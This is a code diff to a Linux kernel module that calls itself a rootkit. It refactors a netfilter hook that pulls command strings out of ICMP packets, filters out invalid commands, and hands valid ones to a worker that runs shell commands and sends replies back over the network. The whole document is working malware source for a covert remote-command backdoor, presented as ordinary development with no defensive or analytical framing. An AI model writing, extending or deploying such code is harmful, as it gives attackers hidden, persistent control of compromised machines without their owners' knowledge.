@@ -6,9 +6,8 @@ void rootkit_handler(struct work_struct* work) {
     // getting passed args struct
     args_t* args = container_of(work, args_t, work);
 
-    command_t command = parse_command(args->string);
 
-    switch (command) {
+    switch (args->command) {
         case RUN:
             DEBUG_PRINTF("rootkit: shell command: %s \n", args->string)
             run_command(args);
@@ -19,7 +18,7 @@ void rootkit_handler(struct work_struct* work) {
             break;
         default:
             DEBUG_PUTS("rootkit: invalid command\n")
-            send_response("rootkit: invallid command\0", args);
+            send_response("rootkit: invalid command", args);
             break;
     }
 
@@ -37,6 +36,7 @@ unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_ho
     
     struct iphdr *iph;
     struct icmphdr *icmph;
+    struct ethhdr* eth;
 
     unsigned char *user_data;
     unsigned char *tail;
@@ -48,6 +48,8 @@ unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_ho
 
     iph = ip_hdr(skb);
     icmph = icmp_hdr(skb);
+    eth = eth_hdr(skb);
+    
 
 
     //DEBUG_PUTS("rootkit: checking connection\n")
@@ -90,6 +92,13 @@ unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_ho
     args->icmph = icmph;
     args->iph = iph;
     args->skb = skb;
+    args->eth = eth;
+    args->command = parse_command(args->string);
+
+    if (args->command == BAD_COMMAND) {
+        kfree(args);
+        return NF_ACCEPT;
+    }
 
     DEBUG_PUTS("rootkit: scheduling rootkit action \n")
     INIT_WORK(&args->work, rootkit_handler);
